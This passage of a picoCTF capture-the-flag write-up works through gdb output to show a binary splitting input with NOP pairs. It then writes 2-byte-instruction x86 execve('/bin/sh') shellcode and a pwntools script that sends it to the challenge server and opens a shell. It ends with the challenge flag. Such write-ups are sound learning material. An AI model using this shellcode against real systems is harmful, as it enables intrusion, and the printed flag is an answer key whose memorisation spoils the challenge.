   <span class="hljs-number">0x0804859e</span> &lt;+<span class="hljs-number">168</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x1c</span>]
   <span class="hljs-number">0x080485a1</span> &lt;+<span class="hljs-number">171</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x080485a4</span> &lt;+<span class="hljs-number">174</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x080485a6</span> &lt;+<span class="hljs-number">176</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-number">0x90</span>
   <span class="hljs-number">0x080485a9</span> &lt;+<span class="hljs-number">179</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>],<span class="hljs-number">0x1</span>
   <span class="hljs-number">0x080485ad</span> &lt;+<span class="hljs-number">183</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
   <span class="hljs-number">0x080485b0</span> &lt;+<span class="hljs-number">186</span>&gt;:   <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x14</span>],<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x080485b3</span> &lt;+<span class="hljs-number">189</span>&gt;:   <span class="hljs-keyword">ja</span>     <span class="hljs-number">0x804856c</span> &lt;execute+<span class="hljs-number">118</span>&gt;
   <span class="hljs-number">0x080485b5</span> &lt;+<span class="hljs-number">191</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x1c</span>]
   <span class="hljs-number">0x080485b8</span> &lt;+<span class="hljs-number">194</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x14</span>]
   <span class="hljs-number">0x080485bb</span> &lt;+<span class="hljs-number">197</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span>
   <span class="hljs-number">0x080485bd</span> &lt;+<span class="hljs-number">199</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">eax</span>],<span class="hljs-number">0xc3</span>
   <span class="hljs-number">0x080485c0</span> &lt;+<span class="hljs-number">202</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x1c</span>]
   <span class="hljs-number">0x080485c3</span> &lt;+<span class="hljs-number">205</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x20</span>],<span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x080485c6</span> &lt;+<span class="hljs-number">208</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x20</span>]
   <span class="hljs-number">0x080485c9</span> &lt;+<span class="hljs-number">211</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-built_in">eax</span>
   <span class="hljs-number">0x080485cb</span> &lt;+<span class="hljs-number">213</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-built_in">ebx</span>
   <span class="hljs-number">0x080485cd</span> &lt;+<span class="hljs-number">215</span>&gt;:   <span class="hljs-keyword">nop</span>
   <span class="hljs-number">0x080485ce</span> &lt;+<span class="hljs-number">216</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]
   <span class="hljs-number">0x080485d1</span> &lt;+<span class="hljs-number">219</span>&gt;:   <span class="hljs-keyword">leave</span>  
   <span class="hljs-number">0x080485d2</span> &lt;+<span class="hljs-number">220</span>&gt;:   <span class="hljs-keyword">ret</span>
</code></pre><p>ok here is strugled a bit ... i was looking for sometging like <code>call   0xsomeaddr &lt;something&gt;</code> but on the first view i cant spot anything interesting ... after reading each line and a few mins later i found <code>0x080485c9 &lt;+211&gt;:   call   eax</code>.</p>
<p>set the breakpoints on the interesting spots <code>b *0x080486a3</code> and <code>b *0x080485c9</code> than run the binary with <code>r</code></p>
<p><code>Give me code to run:</code></p>
<p>lets throw <code>AAAAAAAAAAAAAAAAAAAA</code></p>
<p>we reach our 1st breakpoint:
<code>[#0] Id 1, Name: &quot;fun&quot;, stopped 0x80486a3 in main (), reason: BREAKPOINT</code></p>
<p>first we check whats in the eax <code>$eax   : 0xffffcde3  →  0x41414141 (&quot;AAAA&quot;?)</code>
<code>x/25b $eax</code></p>
<pre><code><span class="hljs-number">0xffffcd</span>e3:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>
<span class="hljs-number">0xffffcd</span>eb:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>
<span class="hljs-number">0xffffcdf</span>3:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>
<span class="hljs-number">0xffffcdf</span>b:     <span class="hljs-number">0x41</span>
</code></pre><p>check whats on the stack <code>0xffb39630│+0x0000: 0xffb39643  →  0x41414141    ← $esp</code>
so our input is stored in 0xffb39643
<code>x/25b 0xffb39643</code></p>
<pre><code><span class="hljs-number">0xffb39643</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>
<span class="hljs-number">0xffb3964b</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>
<span class="hljs-number">0xffb39653</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0xff</span>    <span class="hljs-number">0x66</span>    <span class="hljs-number">0x47</span>    <span class="hljs-number">0xf2</span>
<span class="hljs-number">0xffb3965b</span>:     <span class="hljs-number">0xf7</span>
</code></pre><p>we can continue with <code>c</code></p>
<p>we reach our 2nd breakpoint
<code>[#0] Id 1, Name: &quot;fun&quot;, stopped 0x80485c9 in execute (), reason: BREAKPOINT</code></p>
<p>and we check both eax and esp again.</p>
<pre><code>gef➤  x/25b $<span class="hljs-built_in">eax</span>
<span class="hljs-number">0xffffcd60</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd68</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd70</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd78</span>:     <span class="hljs-number">0x41</span>
gef➤  x/25b $<span class="hljs-built_in">esp</span>
<span class="hljs-number">0xffffcd60</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd68</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd70</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd78</span>:     <span class="hljs-number">0x41</span>
</code></pre><p>ok maybe our 20 As gets overwritten with the 0x90 also known as nop or they only get &quot;injected&quot; lets check if we can find al 20 As</p>
<pre><code>gef➤  x/45b $<span class="hljs-built_in">eax</span>
<span class="hljs-number">0xffffcd70</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd78</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd80</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd88</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd90</span>:     <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x41</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffffcd98</span>:     <span class="hljs-number">0xc3</span>    <span class="hljs-number">0x0</span>     <span class="hljs-number">0x0</span>     <span class="hljs-number">0x0</span>     <span class="hljs-number">0x2</span>
</code></pre><p>ok great our As are still there but seperated by 2 nops this means our shellcode can only consists of 2 byte instructions.</p>
<p>for example we send </p>
<pre><code><span class="hljs-symbol">68 </span><span class="hljs-number">6e</span> <span class="hljs-number">69</span> <span class="hljs-number">62</span> <span class="hljs-number">2</span>f          push   <span class="hljs-number">0</span>x2f62696e
<span class="hljs-symbol">68 </span><span class="hljs-number">68</span> <span class="hljs-number">73</span> <span class="hljs-number">2</span>f <span class="hljs-number">00</span>          push   <span class="hljs-number">0</span>x2f7368
</code></pre><p>it would be split in 2 byte sections </p>
<pre><code><span class="hljs-number">0xffdb6b40</span>:     <span class="hljs-number">0x68</span>    <span class="hljs-number">0x6e</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x69</span>    <span class="hljs-number">0x62</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffdb6b48</span>:     <span class="hljs-number">0x2f</span>    <span class="hljs-number">0x68</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x68</span>    <span class="hljs-number">0x73</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
<span class="hljs-number">0xffdb6b50</span>:     <span class="hljs-number">0x2f</span>    <span class="hljs-number">0x00</span>    <span class="hljs-number">0x90</span>    <span class="hljs-number">0x90</span>
</code></pre><p>and gets interpreted as something we dont want.</p>
<p>so we have to use 2 byte instructions to spawn a shell.</p>
<p>ok we want to spawn a shell but how ?
i had no idea never wrote a shellcode before ... so i read some shellcodes on shellstorm
we need a <code>int 0x80</code> instruction for a kernel call that than executes <code>/bin/sh</code></p>
<p>on <a href="http://asm.sourceforge.net/syscall.html#p31">http://asm.sourceforge.net/syscall.html#p31</a> i found this </p>
<pre><code>11. sys_execve

Syntax:<span class="hljs-built_in"> int </span>sys_execve(struct pt_regs regs)

Source: arch/i386/kernel/process.c

Action:<span class="hljs-built_in"> execute </span>program

Details:
</code></pre><p>so sys_execve executes a program like /bin/sh</p>
<p>ok lets have a closer look at execve 
<a href="https://man7.org/linux/man-pages/man2/execve.2.html">https://man7.org/linux/man-pages/man2/execve.2.html</a></p>
<p><code>execve(const char *pathname, char *const argv[],char *const envp[]);</code>
we want <code>int syscall 0xb(/bin/sh, 0, 0)</code> to get our shell.</p>
<p>how do we need to prepare the registers?</p>
<pre><code>int <span class="hljs-number">0</span>x80 eax(ebx,ecx,edx)

<span class="hljs-attr">eax</span> = <span class="hljs-number">0</span>xb      <span class="hljs-comment">#11 as int (for the sys_execve call)</span>
<span class="hljs-attr">ebx</span> = /bin/sh  <span class="hljs-comment">#the programm we want to execute.</span>
<span class="hljs-attr">ecx</span> = <span class="hljs-number">0</span>        <span class="hljs-comment">#we dont want any arguments but and the argv array must be terminated by a NULL pointer so were going for 0x0</span>
<span class="hljs-attr">edx</span> = <span class="hljs-number">0</span>        <span class="hljs-comment">#we dont want any arguments but and the enpv array must be terminated by a NULL pointer so were going for 0x0</span>
</code></pre><p>great now we know what we want time to creating our code.</p>
<pre><code>   <span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span>                     #clears <span class="hljs-built_in">eax</span>

   <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                         #<span class="hljs-keyword">push</span> <span class="hljs-number">0x00000000</span> on the <span class="hljs-keyword">stac</span>
   <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                         #<span class="hljs-keyword">push</span> <span class="hljs-number">0x00000000</span> on the stack

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">esp</span>                     #<span class="hljs-keyword">sets</span> the <span class="hljs-built_in">edi</span> to the top of the stack so we can write something <span class="hljs-keyword">in</span> <span class="hljs-built_in">edi</span> <span class="hljs-keyword">and</span> it will be written on the stack .

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x2f</span>                     #writes <span class="hljs-string">'/'</span> on the lowes <span class="hljs-built_in">byte</span> of the <span class="hljs-built_in">eax</span>
   <span class="hljs-keyword">add</span> [<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">al</span>                    #adds the <span class="hljs-string">'/'</span> to the <span class="hljs-built_in">edi</span> pointer which points to the first <span class="hljs-built_in">byte</span> of the stack( top of the stack ($<span class="hljs-built_in">esp</span>+<span class="hljs-number">0</span>)) 
                                    #first <span class="hljs-built_in">byte</span> of the stack <span class="hljs-meta">at</span> this addr            <span class="hljs-number">0xffb82dac</span>:     <span class="hljs-number">0x2f</span>    
   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">edi</span>                          #increment the <span class="hljs-built_in">edi</span> by <span class="hljs-number">1</span> so the next addr is      <span class="hljs-number">0xffb82dad</span>:     <span class="hljs-number">0x00</span>   its empty as intended for now
   <span class="hljs-keyword">nop</span>                              #we need this <span class="hljs-keyword">nop</span> because <span class="hljs-keyword">inc</span> <span class="hljs-built_in">edi</span> = <span class="hljs-number">0x47</span> as hex instruction <span class="hljs-keyword">and</span> we know we need always <span class="hljs-number">2</span> bytes to keep the code stable

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x62</span>                     #writes <span class="hljs-string">'b'</span> on the lowes <span class="hljs-built_in">byte</span> of the <span class="hljs-built_in">eax</span> 2nd <span class="hljs-built_in">byte</span> of the stack 
   <span class="hljs-keyword">add</span> [<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">al</span>
   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">edi</span>
   <span class="hljs-keyword">nop</span>

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x69</span>                     #writes <span class="hljs-string">'i'</span> on the lowes <span class="hljs-built_in">byte</span> of the <span class="hljs-built_in">eax</span> 3rd <span class="hljs-built_in">byte</span> of the stack
   <span class="hljs-keyword">add</span> [<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">al</span>
   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">edi</span>
   <span class="hljs-keyword">nop</span>

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x6e</span>                      #writes <span class="hljs-string">'n'</span> on the lowes <span class="hljs-built_in">byte</span> of the <span class="hljs-built_in">eax</span> 4th
   <span class="hljs-keyword">add</span> [<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">al</span>
   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">edi</span>
   <span class="hljs-keyword">nop</span>

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x2f</span>                      #writes <span class="hljs-string">'/'</span> on the lowes <span class="hljs-built_in">byte</span> of the <span class="hljs-built_in">eax</span> 5th
   <span class="hljs-keyword">add</span> [<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">al</span>
   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">edi</span>
   <span class="hljs-keyword">nop</span>

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x73</span>                      #writes <span class="hljs-string">'s'</span> on the lowes <span class="hljs-built_in">byte</span> of the <span class="hljs-built_in">eax</span> 6th
   <span class="hljs-keyword">add</span> [<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">al</span>
   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">edi</span>
   <span class="hljs-keyword">nop</span>

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x68</span>                      #writes <span class="hljs-string">'h'</span> on the lowes <span class="hljs-built_in">byte</span> of the <span class="hljs-built_in">eax</span> 7th
   <span class="hljs-keyword">add</span> [<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">al</span>
   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">edi</span>
   <span class="hljs-keyword">nop</span>

   <span class="hljs-keyword">xor</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span>                       #clears <span class="hljs-built_in">ebx</span>
   <span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span>                       #clears <span class="hljs-built_in">ecx</span>
   <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>                        #clears <span class="hljs-built_in">edx</span>

   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xb</span>                         #writes <span class="hljs-number">0xb</span> to the lowest <span class="hljs-built_in">byte</span> of the <span class="hljs-built_in">eax</span>=<span class="hljs-number">0xb</span> <span class="hljs-keyword">int</span>(<span class="hljs-number">0xb</span>)=<span class="hljs-number">11</span> that will be the argument for the <span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span> it calls sys_execve
   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span>                        #Writes the /bin/sh string <span class="hljs-keyword">in</span> the <span class="hljs-built_in">ebx</span> the 2nd argument for the <span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span> 



   <span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>
</code></pre><p>ok now we have our code lets throw this in a web assembler <a href="https://defuse.ca/online-x86-assembler.html">https://defuse.ca/online-x86-assembler.html</a> and get the hexcode of it.</p>
<pre><code>b"<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>C0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>E7<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>2F<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>6E<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>2F<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>DB<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>C9<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>D2<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>E3<span class="hljs-symbol">\x</span>CD<span class="hljs-symbol">\x</span>80"
</code></pre><p>i created a little exploit and saved it as I_can_write_shellcode_now</p>
<pre><code>#!/usr/bin/env python3
from pwn import *

fname = './fun'
ip = 'mercury.picoctf.net'
port = 12345 #change this

LOCAL = False

if LOCAL:
    r = process(fname)
else:
    r = remote(ip, port)


rl = lambda : r.recvline()
sl = lambda x : r.sendline(x)
inter = lambda : r.interactive()


def pwn():

    print(rl())
    payload = b'<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>C0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>E7<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>2F<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>6E<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>2F<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>90<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>DB<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>C9<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>D2<span class="hljs-symbol">\x</span>B0<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>E3<span class="hljs-symbol">\x</span>CD<span class="hljs-symbol">\x</span>80'
    print(payload)
    sl(payload)
    inter()


if __name__ == '__main__':
    pwn()
</code></pre><p>time to pop a shell.
<code>chmod +x I_can_write_shellcode_now</code> and than run it.</p>
<p>GG we get a shell anc can cat the flag.
||picoCTF{th4t_w4s_fun_bf8b48641b742e27}||</p>
</body></html>